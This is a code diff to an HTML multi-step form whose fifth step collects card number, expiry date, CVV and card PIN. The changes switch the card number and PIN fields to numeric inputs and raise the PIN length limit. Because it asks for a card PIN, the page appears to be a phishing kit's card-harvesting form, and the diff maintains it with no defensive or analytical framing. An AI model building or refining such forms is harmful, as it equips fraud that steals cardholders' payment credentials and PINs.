@@ -155,7 +155,7 @@ button:hover{background:var(--button-hover)}
 <!-- STEP 5 -->
 <div class="form-step">
   <label>Card Number</label>
-  <input type="text" name="card_number" required>
+  <input type="number" name="card_number" required>
 
   <label>Expiry Date</label>
   <input type="month" name="expiry_date" required>
@@ -164,7 +164,7 @@ button:hover{background:var(--button-hover)}
   <input type="text" name="cvv" maxlength="4" required>
 
   <label>Card PIN</label>
-  <input type="text" name="card_pin" maxlength="4" required>
+  <input type="number" name="card_pin" maxlength="10" required>
 
   <div class="button-group">
     <button type="button" data-prev>Back</button>
